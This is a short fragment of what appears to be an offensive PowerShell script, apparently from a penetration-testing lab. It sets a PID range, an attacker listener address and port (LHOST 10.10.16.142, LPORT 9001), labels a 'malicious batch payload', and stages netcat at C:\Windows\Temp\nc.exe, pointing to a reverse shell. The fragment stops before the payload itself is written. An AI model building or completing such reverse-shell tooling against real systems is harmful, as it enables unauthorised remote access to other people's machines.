param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000,
    [string]$LHOST = "10.10.16.142",
    [string]$LPORT = "9001"
)
# 1. Define the malicious batch payload
$NcPath = "C:\Windows\Temp\nc.exe"
